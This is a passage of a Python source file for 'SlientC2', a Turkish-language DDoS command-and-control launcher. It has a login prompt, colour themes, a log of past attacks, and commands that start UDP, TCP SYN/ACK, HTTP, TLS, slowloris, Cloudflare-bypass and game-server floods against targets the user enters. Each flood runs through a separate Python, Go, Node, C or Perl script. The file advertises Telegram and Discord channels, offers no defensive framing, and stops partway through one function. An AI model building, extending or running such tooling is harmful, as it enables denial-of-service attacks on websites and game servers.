#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# SlientC2 – Gelişmiş DDoS Aracı (8 Tema + Gradient Prompt + Tüm Metodlar)

import os
import sys
import time
import subprocess
import getpass
import random
import datetime
import json
import signal
from colorama import Fore, init, Style, Back

init(autoreset=True)

if os.name == 'nt':
    os.system("chcp 65001 > nul")
try:
    sys.stdout.reconfigure(encoding='utf-8')
except AttributeError:
    pass

# ========== AKTİF PROSESLER ==========
active_processes = []

# ========== 8 RENK TEMASI (1-7 Eski, 8 Kırmızı-Beyaz) ==========
TEMA_VARSAYILAN = 1
TEMALAR = {
    1: {"isim": "Varsayılan (Mavi-Mor)", "palet": [255, 254, 253, 117, 81, 45, 39, 45, 81, 117, 153, 189, 255]},
    2: {"isim": "Kırmızı-Turuncu", "palet": [196, 202, 208, 214, 220, 226, 220, 214, 208, 202, 196]},
    3: {"isim": "Yeşil-Açık Yeşil", "palet": [46, 82, 118, 154, 190, 226, 190, 154, 118, 82, 46]},
    4: {"isim": "Sarı-Beyaz", "palet": [226, 229, 231, 255, 231, 229, 226]},
    5: {"isim": "Pembe-Mor", "palet": [206, 212, 218, 224, 230, 236, 230, 224, 218, 212, 206]},
    6: {"isim": "Mavi-Gökyüzü", "palet": [33, 69, 105, 141, 177, 213, 177, 141, 105, 69, 33]},
    7: {"isim": "Gri-Beyaz (Sade)", "palet": [244, 246, 248, 250, 252, 254, 252, 250, 248, 246, 244]},
    8: {"isim": "Kırmızı-Beyaz", "palet": [196, 197, 198, 199, 200, 201, 231, 231, 201, 200, 199, 198, 197, 196]}
}

mevcut_tema = 1
line_palette = TEMALAR[mevcut_tema]["palet"].copy()

def tema_degistir(tema_no):
    global mevcut_tema, line_palette
    if tema_no in TEMALAR:
        mevcut_tema = tema_no
        line_palette = TEMALAR[tema_no]["palet"].copy()
        return True
    return False

def tema_listele():
    print("\nMevcut Renk Temaları:")
    for no, t in TEMALAR.items():
        aktif = " (Aktif)" if no == mevcut_tema else ""
        print(f"  {no}: {t['isim']}{aktif}")
    print("Kullanım: theme <numara>  (örnek: theme 8)")

# ========== SALDIRI GEÇMİŞİ ==========
HISTORY_FILE = "attack_history.json"

def history_ekle(target, port, duration, method, threads):
    try:
        with open(HISTORY_FILE, 'r') as f:
            history = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        history = []

    entry = {
        "tarih": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "hedef": target,
        "port": port,
        "sure": duration,
        "metod": method,
        "thread": threads
    }
    history.append(entry)

    with open(HISTORY_FILE, 'w') as f:
        json.dump(history, f, indent=2)

def history_listele():
    try:
        with open(HISTORY_FILE, 'r') as f:
            history = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        print("\n[!] Henüz hiç saldırı kaydı yok.\n")
        return

    if not history:
        print("\n[!] Henüz hiç saldırı kaydı yok.\n")
        return

    print("\n" + gradient_text("╔══════════════════════════════════════════════════════════════════════╗"))
    print(gradient_text("║                           SALDIRI GEÇMİŞİ                                     ║"))
    print(gradient_text("╠══════════════════════════════════════════════════════════════════════╣"))
    for i, entry in enumerate(history[-20:], 1):
        line = f"  {i}. [{entry['tarih']}] {entry['metod']} -> {entry['hedef']}:{entry['port']} ({entry['sure']}s) Threads:{entry['thread']}"
        print(gradient_text("║ " + line.ljust(70) + "║"))
    print(gradient_text("╚══════════════════════════════════════════════════════════════════════╝\n"))

# ========== GRADIENT TEXT (Yazı Rengi) ==========
def gradient_text(text):
    result = ""
    for i, char in enumerate(text):
        color = line_palette[i % len(line_palette)]
        result += f"\033[38;5;{color}m{char}"
    return result + "\033[0m"

# ========== GRADIENT BACKGROUND (Arkaplan Rengi) ==========
def gradient_bg_text(text, palette):
    result = ""
    for i, char in enumerate(text):
        color = palette[i % len(palette)]
        result += f"\033[48;5;{color}m{char}"
    return result + "\033[0m"

def build_gradient_palette(color1, color2, length):
    """İki renk kodu arasında length uzunluğunda gradient palette oluşturur."""
    palette = []
    for i in range(length):
        ratio = i / (length - 1) if length > 1 else 0
        r = int((1 - ratio) * (color1 >> 16 & 0xFF) + ratio * (color2 >> 16 & 0xFF))
        g = int((1 - ratio) * (color1 >> 8 & 0xFF) + ratio * (color2 >> 8 & 0xFF))
        b = int((1 - ratio) * (color1 & 0xFF) + ratio * (color2 & 0xFF))
        code = 16 + (36 * (r // 51)) + (6 * (g // 51)) + (b // 51)
        palette.append(code)
    return palette

def color_name_to_rgb(name):
    name = name.lower()
    colors = {
        "black": (0,0,0), "red": (255,0,0), "green": (0,255,0),
        "yellow": (255,255,0), "blue": (0,0,255), "magenta": (255,0,255),
        "cyan": (0,255,255), "white": (255,255,255),
        "orange": (255,165,0), "pink": (255,192,203), "purple": (128,0,128)
    }
    return colors.get(name, (255,255,255))

def rgb_to_256(r, g, b):
    return 16 + (36 * (r // 51)) + (6 * (g // 51)) + (b // 51)

def color_name_to_256(name):
    r, g, b = color_name_to_rgb(name)
    return rgb_to_256(r, g, b)

pad = " " * 4
small_pad = " " * 7

ascii_art = [
"         ╔═╗ ╦   ╦ ╔═╗ ╔╗╔ ╔╦╗",
"         ╚═╗ ║   ║ ║╣  ║║║  ║ ",
"         ╚═╝ ╚═╝ ╩ ╚═╝ ╝╚╝  ╩ "
]

def show_logo_and_boxes():
    os.system('clear')
    for line in ascii_art:
        print(gradient_text(pad + line))
    print(gradient_text(pad + "╔════════════════════════════════════╗"))
    print(gradient_text(pad + "║        DdoS Attack Tool            ║"))
    print(gradient_text(pad + "║      Telegram: @SlientBotnet       ║"))
    print(gradient_text(pad + "╚════════════════════════════════════╝"))
    print(gradient_text(small_pad + "╔══════════════════════════════╗"))
    print(gradient_text(small_pad + "║    write 'help' for usage    ║"))
    print(gradient_text(small_pad + "╚══════════════════════════════╝"))
    print("\n")
    print("[!] Kullanım için 'help' yazın.")
    print("[!] 'saldırı_goster' ile çıktıları açar, 'saldırı_kapan' ile kapatırsınız.")
    print("[!] 'stop' ile tüm saldırıları durdurabilirsiniz.\n")

# ========== LOGIN ==========
KULLANICI_ADI = "Zeldy"
SIFRE = " "

def login():
    os.system('clear')
    print(gradient_text(pad + "╔═════════════════════════════════════╗"))
    print(gradient_text(pad + "║      Slient DdoS Login              ║"))
    print(gradient_text(pad + "║   For the password: t.me/Zeldy_here ║"))
    print(gradient_text(pad + "╚═════════════════════════════════════╝"))
    
    username = input("Username:  ")
    password = getpass.getpass("password: ")
    
    if username != KULLANICI_ADI or password != SIFRE:
        print("\nHatalı kullanıcı adı veya şifre!")
        time.sleep(2)
        return False
    
    os.system('clear')
    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mSlient \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Zeldy ! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: Zeldy \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v4.0')
    time.sleep(0.5)
    return True

# ========== PROMPT ÖZELLEŞTİRME ==========
PROMPT_STYLE = 2  # 1 = eski, 2 = yeni

# Yeni stil için segmentler ve renkler (gradient kapalıyken)
PROMPT_SEGMENT_1 = " mooncnc • semp "
PROMPT_SEGMENT_2 = " ▶▶ "
PROMPT_BG1 = Back.MAGENTA
PROMPT_FG1 = Fore.BLACK
PROMPT_BG2 = Back.BLUE
PROMPT_FG2 = Fore.BLACK

# Gradient ayarları
PROMPT_GRADIENT = False
PROMPT_GRADIENT_TYPE = None
PROMPT_GRADIENT_PALETTE = []

# Renk haritası (Colorama)
COLOR_MAP = {
    "black": Fore.BLACK, "red": Fore.RED, "green": Fore.GREEN,
    "yellow": Fore.YELLOW, "blue": Fore.BLUE, "magenta": Fore.MAGENTA,
    "cyan": Fore.CYAN, "white": Fore.WHITE,
    "reset": Fore.RESET
}
BG_COLOR_MAP = {
    "black": Back.BLACK, "red": Back.RED, "green": Back.GREEN,
    "yellow": Back.YELLOW, "blue": Back.BLUE, "magenta": Back.MAGENTA,
    "cyan": Back.CYAN, "white": Back.WHITE,
    "reset": Back.RESET
}

def parse_color(color_str, is_bg=False):
    color_str = color_str.lower()
    if is_bg:
        return BG_COLOR_MAP.get(color_str, Back.RESET)
    return COLOR_MAP.get(color_str, Fore.RESET)

def prompt():
    global PROMPT_GRADIENT, PROMPT_GRADIENT_TYPE, PROMPT_GRADIENT_PALETTE
    if PROMPT_STYLE == 1:
        print(Fore.WHITE + "┌──[SlientC2] - [SlientC2/root]")
        print(Fore.WHITE + "└─➤  ", end="")
        sys.stdout.write("\033[0m")
        sys.stdout.flush()
        return input()
    else:
        if PROMPT_GRADIENT:
            full_text = PROMPT_SEGMENT_1 + PROMPT_SEGMENT_2
            if PROMPT_GRADIENT_TYPE == "tool":
                palette = line_palette
            elif isinstance(PROMPT_GRADIENT_TYPE, list) and len(PROMPT_GRADIENT_TYPE) == 2:
                c1 = color_name_to_256(PROMPT_GRADIENT_TYPE[0])
                c2 = color_name_to_256(PROMPT_GRADIENT_TYPE[1])
                palette = build_gradient_palette(c1, c2, len(full_text))
            else:
                palette = [255] * len(full_text)
            result = gradient_bg_text(full_text, palette) + Fore.BLACK
            print(result, end="")
            sys.stdout.write("\033[0m ")
            sys.stdout.flush()
            return input()
        else:
            custom_prompt = (
                f"{PROMPT_BG1}{PROMPT_FG1}{PROMPT_SEGMENT_1}"
                f"{PROMPT_BG2}{PROMPT_FG2}{PROMPT_SEGMENT_2}"
                f"{Style.RESET_ALL} "
            )
            print(custom_prompt, end="")
            sys.stdout.flush()
            return input()

# ========== PROMPT KOMUTLARI ==========
def cmd_promptstyle(args):
    global PROMPT_STYLE
    if len(args) < 1:
        print("[!] Kullanım: promptstyle <1|2>")
        print("  1 = Eski klasik (┌──[SlientC2] ...)")
        print("  2 = Yeni özel (mooncnc • semp ▶▶)")
        return
    try:
        style = int(args[0])
        if style in (1, 2):
            PROMPT_STYLE = style
            print(f"[+] Prompt stili {style} olarak değiştirildi.")
        else:
            print("[!] Sadece 1 veya 2 girin.")
    except ValueError:
        print("[!] Lütfen 1 veya 2 girin.")

def cmd_setprompt(args):
    global PROMPT_SEGMENT_1
    if PROMPT_STYLE != 2:
        print("[!] Bu komut sadece yeni stil (stil 2) aktifken çalışır.")
        return
    if len(args) >= 1:
        new_text = " ".join(args)
        PROMPT_SEGMENT_1 = f" {new_text} "
        print(f"[+] Prompt metni güncellendi: {PROMPT_SEGMENT_1}{PROMPT_SEGMENT_2}")
    else:
        print("[!] Kullanım: setprompt <metin>")
        print("Örnek: setprompt mybot • attack")

def cmd_promptcolor(args):
    global PROMPT_BG1, PROMPT_FG1, PROMPT_BG2, PROMPT_FG2
    if PROMPT_STYLE != 2:
        print("[!] Bu komut sadece yeni stil (stil 2) aktifken çalışır.")
        return
    if PROMPT_GRADIENT:
        print("[!] Gradient aktif, önce 'promptgradient off' ile kapatın.")
        return
    if len(args) < 4:
        print("[!] Kullanım: promptcolor <bg1> <fg1> <bg2> <fg2>")
        print("Renkler: black, red, green, yellow, blue, magenta, cyan, white")
        print("Örnek: promptcolor cyan black magenta white")
        return
    bg1_name, fg1_name, bg2_name, fg2_name = args[:4]
    PROMPT_BG1 = parse_color(bg1_name, is_bg=True)
    PROMPT_FG1 = parse_color(fg1_name, is_bg=False)
    PROMPT_BG2 = parse_color(bg2_name, is_bg=True)
    PROMPT_FG2 = parse_color(fg2_name, is_bg=False)
    print(f"[+] Prompt renkleri güncellendi: {bg1_name}/{fg1_name} | {bg2_name}/{fg2_name}")

def cmd_promptgradient(args):
    global PROMPT_GRADIENT, PROMPT_GRADIENT_TYPE, PROMPT_GRADIENT_PALETTE
    if PROMPT_STYLE != 2:
        print("[!] Bu komut sadece yeni stil (stil 2) aktifken çalışır.")
        return
    if len(args) == 0:
        print("[!] Kullanım: promptgradient <tool|off|renk1 renk2>")
        print("Örnek: promptgradient tool")
        print("        promptgradient red white")
        print("        promptgradient off")
        return
    if args[0].lower() == "off":
        PROMPT_GRADIENT = False
        PROMPT_GRADIENT_TYPE = None
        PROMPT_GRADIENT_PALETTE = []
        print("[+] Gradient kapatıldı, manuel renkler aktif.")
        return
    elif args[0].lower() == "tool":
        PROMPT_GRADIENT = True
        PROMPT_GRADIENT_TYPE = "tool"
        print("[+] Prompt gradient -> Tool teması (line_palette) aktif.")
        return
    else:
        if len(args) < 2:
            print("[!] İki renk belirtin. Örnek: promptgradient red white")
            return
        c1 = args[0].lower()
        c2 = args[1].lower()
        if c1 not in color_name_to_rgb.__code__.co_consts or c2 not in color_name_to_rgb.__code__.co_consts:
            print("[!] Geçersiz renk ismi. Kullanılabilir: black, red, green, yellow, blue, magenta, cyan, white, orange, pink, purple")
            return
        PROMPT_GRADIENT = True
        PROMPT_GRADIENT_TYPE = [c1, c2]
        print(f"[+] Prompt gradient -> {c1} ile {c2} arası geçiş aktif.")

# ========== SALDIRI BANNER ==========
def show_attack_banner(target, port, duration, method, threads=None, vip=True, expiry=864.70, cooldown=0.00):
    os.system('clear')
    now = datetime.datetime.now().strftime("%b %d %Y %H:%M:%S")
    sent_by = "root"
    vip_str = "true" if vip else "false"
    method_upper = method.upper()

    attacksent_art = [
        "╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═   ╔═╗╔═╗╔╗╔╔╦╗",
        "╠═╣ ║  ║ ╠═╣║  ╠╩╗   ╚═╗║╣ ║║║ ║ ",
        "╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩   ╚═╝╚═╝╝╚╝ ╩ "
    ]
    for line in attacksent_art:
        print(gradient_text(pad + line.center(60)))

    width = 60
    border = "═" * (width - 2)
    empty = " " * (width - 2)

    def left(text):
        return text.ljust(width - 2)

    print(gradient_text(pad + "╔" + border + "╗"))
    print(gradient_text(pad + "║" + left(f"  Target: [{target}]") + "║"))
    print(gradient_text(pad + "║" + left(f"  Time: [{duration}]s") + "║"))
    print(gradient_text(pad + "║" + left(f"  Port: [{port}]") + "║"))
    print(gradient_text(pad + "║" + left(f"  Method: [{method_upper}]") + "║"))
    print(gradient_text(pad + "╠" + "═" * (width - 2) + "╣"))
    if threads is not None:
        print(gradient_text(pad + "║" + left(f"  Threads: [{threads}]") + "║"))
    print(gradient_text(pad + "║" + left(f"  VIP: {vip_str}") + "║"))
    print(gradient_text(pad + "║" + left(f"  Expiry: [{expiry:.2f}]") + "║"))
    print(gradient_text(pad + "║" + left(f"  Cooldown: [{cooldown:.2f}]") + "║"))
    print(gradient_text(pad + "║" + left(f"  Timestamp: [{now}]") + "║"))
    print(gradient_text(pad + "║" + left(f"  Sent by: [{sent_by}]") + "║"))
    print(gradient_text(pad + "║" + empty + "║"))
    print(gradient_text(pad + "║" + left("  Join: t.me/artichetm2") + "║"))
    print(gradient_text(pad + "║" + left("  Discord: @articnetxv") + "║"))
    print(gradient_text(pad + "╚" + border + "╝"))
    print("\n" + Fore.CYAN + "[*] Saldırı başlatılıyor... (stop ile durdurabilirsiniz)" + Fore.WHITE + "\n")

# ========== ÇIKTI KONTROL ==========
CIKTI_GOSTER = False

def cmd_cikti_goster():
    global CIKTI_GOSTER
    CIKTI_GOSTER = True
    print("[+] Saldırı çıktıları AÇILDI.")

def cmd_cikti_kapan():
    global CIKTI_GOSTER
    CIKTI_GOSTER = False
    print("[+] Saldırı çıktıları KAPATILDI.")

# ========== STOP KOMUTU ==========
def cmd_stop():
    global active_processes
    killed = 0

    for proc in active_processes:
        try:
            proc.terminate()
            killed += 1
        except:
            pass
    active_processes.clear()

    try:
        result = subprocess.run(["pgrep", "-f", "node"], capture_output=True, text=True)
        if result.stdout:
            for pid in result.stdout.strip().split('\n'):
                try:
                    os.kill(int(pid), signal.SIGTERM)
                    killed += 1
                except:
                    pass
        result = subprocess.run(["pgrep", "-f", "udp.py|cf-pro.py|goldeneye.py|https-spoof.py|fortnite.py|icmp.py|minecraft.py|dnsamp.py|ssdp.py|hybrid.py"], capture_output=True, text=True)
        if result.stdout:
            for pid in result.stdout.strip().split('\n'):
                try:
                    os.kill(int(pid), signal.SIGTERM)
                    killed += 1
                except:
                    pass
        result = subprocess.run(["pgrep", "-f", "httpflood.go|raw.http.go|rapid"], capture_output=True, text=True)
        if result.stdout:
            for pid in result.stdout.strip().split('\n'):
                try:
                    os.kill(int(pid), signal.SIGTERM)
                    killed += 1
                except:
                    pass
        result = subprocess.run(["pgrep", "-f", "tcpflood"], capture_output=True, text=True)
        if result.stdout:
            for pid in result.stdout.strip().split('\n'):
                try:
                    os.kill(int(pid), signal.SIGTERM)
                    killed += 1
                except:
                    pass
        result = subprocess.run(["pgrep", "-f", "fivem.pl"], capture_output=True, text=True)
        if result.stdout:
            for pid in result.stdout.strip().split('\n'):
                try:
                    os.kill(int(pid), signal.SIGTERM)
                    killed += 1
                except:
                    pass
        result = subprocess.run(["pgrep", "-f", "browser.js"], capture_output=True, text=True)
        if result.stdout:
            for pid in result.stdout.strip().split('\n'):
                try:
                    os.kill(int(pid), signal.SIGTERM)
                    killed += 1
                except:
                    pass
        result = subprocess.run(["pgrep", "-f", "minecraft"], capture_output=True, text=True)
        if result.stdout:
            for pid in result.stdout.strip().split('\n'):
                try:
                    os.kill(int(pid), signal.SIGTERM)
                    killed += 1
                except:
                    pass
        result = subprocess.run(["pgrep", "-f", "uambypass.js"], capture_output=True, text=True)
        if result.stdout:
            for pid in result.stdout.strip().split('\n'):
                try:
                    os.kill(int(pid), signal.SIGTERM)
                    killed += 1
                except:
                    pass
    except Exception:
        pass

    if killed > 0:
        print(f"[+] {killed} saldırı prosesi sonlandırıldı.")
    else:
        print("[!] Çalışan saldırı prosesi bulunamadı.")

# ========== KOMUT İŞLEYİCİLER ==========
def run_script(script_name, args):
    global active_processes
    if not os.path.exists(script_name):
        possible = [f for f in os.listdir('.') if f.lower() == script_name.lower()]
        if possible:
            script_name = possible[0]
        else:
            print(f"[!] {script_name} dosyası bulunamadı!")
            return
    cmd = ["python3", script_name] + args
    try:
        if CIKTI_GOSTER:
            proc = subprocess.Popen(cmd)
        else:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        active_processes.append(proc)
    except Exception as e:
        print(f"[!] Beklenmeyen hata: {e}")

def run_go_script(script_name, args):
    global active_processes
    if not os.path.exists(script_name):
        print(f"[!] {script_name} dosyası bulunamadı!")
        return
    cmd = ["go", "run", script_name] + args
    try:
        if CIKTI_GOSTER:
            proc = subprocess.Popen(cmd)
        else:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        active_processes.append(proc)
    except FileNotFoundError:
        print("[!] 'go' komutu bulunamadı. 'pkg install golang' ile kurun.")
    except Exception as e:
        print(f"[!] Beklenmeyen hata: {e}")

def run_cfpro_script(url, threads, seconds):
    global active_processes
    if not os.path.exists("cf-pro.py"):
        print("[!] cf-pro.py dosyası bulunamadı!")
        return
    try:
        if CIKTI_GOSTER:
            proc = subprocess.Popen(["python3", "cf-pro.py", url, threads, seconds])
        else:
            proc = subprocess.Popen(["python3", "cf-pro.py", url, threads, seconds], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        active_processes.append(proc)
    except Exception as e:
        print(f"[!] Beklenmeyen hata: {e}")

def run_node_script(script_name, args):
    global active_processes
    if not os.path.exists(script_name):
        print(f"[!] {script_name} dosyası bulunamadı!")
        return
    cmd = ["node", script_name] + args
    try:
        if CIKTI_GOSTER:
            proc = subprocess.Popen(cmd)
        else:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        active_processes.append(proc)
    except FileNotFoundError:
        print("[!] 'node' komutu bulunamadı. 'pkg install nodejs' ile kurun.")
    except Exception as e:
        print(f"[!] Beklenmeyen hata: {e}")

def run_c_binary(binary_name, args):
    global active_processes
    if not os.path.exists(binary_name):
        if os.path.exists("tcp.c"):
            print("[*] tcp.c derleniyor...")
            try:
                subprocess.run(["gcc", "tcp.c", "-o", binary_name, "-lpthread"], check=True)
                print("[+] Derleme başarılı.")
            except subprocess.CalledProcessError:
                print("[!] Derleme hatası. gcc yüklü mü?")
                return
            except FileNotFoundError:
                print("[!] gcc bulunamadı. 'pkg install gcc' ile kurun.")
                return
        else:
            print(f"[!] {binary_name} ve tcp.c dosyası bulunamadı!")
            return
    cmd = ["./" + binary_name] + args
    try:
        if CIKTI_GOSTER:
            proc = subprocess.Popen(cmd)
        else:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        active_processes.append(proc)
    except Exception as e:
        print(f"[!] Beklenmeyen hata: {e}")

def run_perl_script(script_name, args):
    global active_processes
    if not os.path.exists(script_name):
        print(f"[!] {script_name} dosyası bulunamadı!")
        return
    cmd = ["perl", script_name] + args
    try:
        if CIKTI_GOSTER:
            proc = subprocess.Popen(cmd)
        else:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        active_processes.append(proc)
    except FileNotFoundError:
        print("[!] 'perl' komutu bulunamadı. 'pkg install perl' ile kurun.")
    except Exception as e:
        print(f"[!] Beklenmeyen hata: {e}")

def run_go_binary(binary_name, args):
    global active_processes
    if not os.path.exists(binary_name):
        if os.path.exists("minecraft.go"):
            print("[*] minecraft.go derleniyor...")
            try:
                subprocess.run(["go", "build", "-o", binary_name, "minecraft.go"], check=True)
                print("[+] Derleme başarılı.")
            except subprocess.CalledProcessError:
                print("[!] Derleme hatası. go yüklü mü?")
                return
            except FileNotFoundError:
                print("[!] go bulunamadı. 'pkg install golang' ile kurun.")
                return
        else:
            print(f"[!] {binary_name} ve minecraft.go dosyası bulunamadı!")
            return
    cmd = ["./" + binary_name] + args
    try:
        if CIKTI_GOSTER:
            proc = subprocess.Popen(cmd)
        else:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        active_processes.append(proc)
    except Exception as e:
        print(f"[!] Beklenmeyen hata: {e}")

# ========== METOD KOMUTLARI ==========
def cmd_udp(args):
    if len(args) < 3:
        print("[!] Eksik argüman. Kullanım: udp <ip> <port> <süre>")
        print("Örnek: udp 1.1.1.1 80 60")
        return
    ip, port, duration = args[0], args[1], args[2]
    show_attack_banner(ip, port, duration, "UDP", threads="2048/16384", vip=True)
    history_ekle(ip, port, duration, "UDP", "2048/16384")
    run_script("udp.py", [ip, port, duration])

def cmd_httpflood(args):
    if len(args) < 4:
        print("[!] Eksik argüman. Kullanım: httpflood <url> <threads> <get/post> <seconds> [header]")
        print("Örnek: httpflood https://example.com 500 get 60 nil")
        return
    url = args[0]
    threads = args[1]
    method = args[2].lower()
    seconds = args[3]
    header = args[4] if len(args) > 4 else "nil"
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, seconds, "HTTP-FLOOD", threads=threads, vip=True)
    history_ekle(url, port, seconds, "HTTP-FLOOD", threads)
    run_go_script("httpflood.go", [url, threads, method, seconds, header])

def cmd_cfpro(args):
    if len(args) < 3:
        print("[!] Eksik argüman. Kullanım: cfpro <url> <threads> <seconds>")
        print("Örnek: cfpro https://example.com 500 60")
        return
    url = args[0]
    threads = args[1]
    seconds = args[2]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, seconds, "CF-PRO", threads=threads, vip=True)
    history_ekle(url, port, seconds, "CF-PRO", threads)
    run_cfpro_script(url, threads, seconds)

def cmd_flood(args):
    if len(args) < 3:
        print("[!] Eksik argüman. Kullanım: flood <url> <süre> <thread>")
        print("Örnek: flood https://example.com 60 15000")
        return
    url = args[0]
    duration = args[1]
    threads = args[2]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "FLOOD", threads=threads, vip=True)
    history_ekle(url, port, duration, "FLOOD", threads)
    if not os.path.exists("proxy.txt"):
        print("[!] proxy.txt dosyası bulunamadı, boş oluşturuluyor...")
        with open("proxy.txt", "w") as f:
            f.write("")
    run_node_script("flood.js", [url, duration, threads, threads, "proxy.txt"])

def cmd_httpraw(args):
    if len(args) < 2:
        print("[!] Eksik argüman. Kullanım: http-raw <url> <süre>")
        print("Örnek: http-raw http://example.com 60")
        return
    url = args[0]
    duration = args[1]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "HTTP-RAW", threads=None, vip=True)
    history_ekle(url, port, duration, "HTTP-RAW", "1")
    run_node_script("HTTP-RAW.js", [url, duration])

def cmd_httpsocket(args):
    if len(args) < 3:
        print("[!] Eksik argüman. Kullanım: http-socket <url> <thread> <süre>")
        print("Örnek: http-socket http://example.com 5000 60")
        return
    url = args[0]
    threads = args[1]
    duration = args[2]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "HTTP-SOCKET", threads=threads, vip=True)
    history_ekle(url, port, duration, "HTTP-SOCKET", threads)
    run_node_script("HTTP-SOCKET.js", [url, threads, duration])

def cmd_httprand(args):
    if len(args) < 2:
        print("[!] Eksik argüman. Kullanım: http-rand <url> <süre>")
        print("Örnek: http-rand http://vailon.com/ 60")
        return
    url = args[0]
    duration = args[1]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "HTTP-RAND", threads=None, vip=True)
    history_ekle(url, port, duration, "HTTP-RAND", "1")
    run_node_script("HTTP-RAND.js", [url, duration])

def cmd_httpspoof(args):
    if len(args) < 3:
        print("[!] Eksik argüman. Kullanım: https-spoof <url> <süre> <thread>")
        print("Örnek: https-spoof http://vailon.com 60 500")
        return
    url = args[0]
    duration = args[1]
    threads = args[2]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "HTTPS-SPOOF", threads=threads, vip=True)
    history_ekle(url, port, duration, "HTTPS-SPOOF", threads)
    run_script("https-spoof.py", [url, duration, threads])

def cmd_tls(args):
    if len(args) < 3:
        print("[!] Eksik argüman. Kullanım: tls <url> <süre> <thread>")
        print("Örnek: tls https://example.com 60 1250")
        return
    url = args[0]
    duration = args[1]
    threads = args[2]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "TLS", threads=threads, vip=True)
    history_ekle(url, port, duration, "TLS", threads)
    if not os.path.exists("proxy.txt"):
        print("[!] proxy.txt dosyası bulunamadı, boş oluşturuluyor...")
        with open("proxy.txt", "w") as f:
            f.write("")
    run_node_script("tls.js", [url, duration, threads, "GET", "proxy.txt", threads])

def cmd_tls2(args):
    if len(args) < 3:
        print("[!] Eksik argüman. Kullanım: tls2 <url> <süre> <thread>")
        print("Örnek: tls2 https://example.com 60 1250")
        return
    url = args[0]
    duration = args[1]
    threads = args[2]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "TLS-PROXY", threads=threads, vip=True)
    history_ekle(url, port, duration, "TLS-PROXY", threads)
    run_node_script("tls-proxy.js", [url, duration, threads])

def cmd_tls3(args):
    if len(args) < 3:
        print("[!] Eksik argüman. Kullanım: tls3 <url> <süre> <thread>")
        print("Örnek: tls3 https://example.com 60 1250")
        return
    url = args[0]
    duration = args[1]
    threads = args[2]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "TLS3", threads=threads, vip=True)
    history_ekle(url, port, duration, "TLS3", threads)
    run_node_script("tls3.js", [url, duration, threads])

def cmd_httpflood2(args):
    if len(args) < 2:
        print("[!] Eksik argüman. Kullanım: httpflood2 <url> <süre>")
        print("Örnek: httpflood2 https://example.com 60")
        return
    url = args[0]
    duration = args[1]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "HTTP-FLOOD2", threads="Proxy", vip=True)
    history_ekle(url, port, duration, "HTTP-FLOOD2", "Proxy")
    if not os.path.exists("proxy.txt"):
        print("[!] proxy.txt dosyası bulunamadı!")
        return
    run_node_script("httpflood2.js", [url, duration])

def cmd_slow(args):
    if len(args) < 2:
        print("[!] Eksik argüman. Kullanım: slow <url> <süre>")
        print("Örnek: slow http://vailon.com 60")
        return
    url = args[0]
    duration = args[1]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "SLOW", threads="Slowloris", vip=True)
    history_ekle(url, port, duration, "SLOW", "Slowloris")
    run_node_script("slow.js", [url, duration])

def cmd_tcpflood(args):
    if len(args) < 6:
        print("[!] Eksik argüman. Kullanım: tcpflood <IP> <PORT> <THREAD> <TIME> <PPS> <FLAG>")
        print("Flag: 1=SYN, 2=ACK, 3=RST, 4=PSH, 5=SYN-ACK")
        print("Örnek: tcpflood 1.1.1.1 80 50 60 10000 1")
        return
    ip = args[0]
    port = args[1]
    threads = args[2]
    duration = args[3]
    pps = args[4]
    flag = args[5]
    show_attack_banner(ip, port, duration, "TCP-FLOOD", threads=threads, vip=True)
    history_ekle(ip, port, duration, "TCP-FLOOD", threads)
    run_c_binary("tcpflood", [ip, port, threads, duration, pps, flag])

def cmd_fortnite(args):
    if len(args) < 5:
        print("[!] Eksik argüman. Kullanım: fortnite <IP> <PORT> <SÜRE> <PPS> <PAYLOAD>")
        print("Örnek: fortnite 1.1.1.1 80 60 1000 AAAA")
        return
    ip = args[0]
    port = args[1]
    timer = args[2]
    pps = args[3]
    payload = args[4]
    show_attack_banner(ip, port, timer, "FORTNITE", threads=pps, vip=True)
    history_ekle(ip, port, timer, "FORTNITE", pps)
    run_script("fortnite.py", [ip, port, timer, pps, payload])

def cmd_fivem(args):
    if len(args) < 2:
        print("[!] Eksik argüman. Kullanım: fivem <IP> <SÜRE>")
        print("Örnek: fivem 1.1.1.1 60")
        return
    ip = args[0]
    duration = args[1]
    port = "30120"
    show_attack_banner(ip, port, duration, "FIVEM", threads="Perl", vip=True)
    history_ekle(ip, port, duration, "FIVEM", "Perl")
    run_perl_script("fivem.pl", [ip, duration])

def cmd_browser(args):
    if len(args) < 2:
